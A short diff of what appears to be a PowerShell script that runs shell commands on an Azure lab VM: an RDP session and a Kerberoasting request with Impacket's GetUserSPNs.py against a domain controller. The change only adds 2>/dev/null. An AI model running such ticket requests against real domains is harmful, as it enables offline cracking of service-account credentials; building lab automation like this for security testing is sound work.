@@ -59,7 +59,7 @@ su - adm0 -c 'whoami'
 su - adm0 -c 'DISPLAY=:99 xfreerdp --version'
 su - adm0 -c 'DISPLAY=:99 timeout 90 xfreerdp /v:10.0.0.6 /u:adm0 /p:'$adminPassword' /dynamic-resolution /cert:ignore &'
 python3 /tmp/temp_script.py
-sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request | head -n 3
+sudo /root/.local/bin/GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request | head -n 3 2>/dev/null
 "@
 
 $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName $vmName -CommandId "RunShellScript" -ScriptString $Command
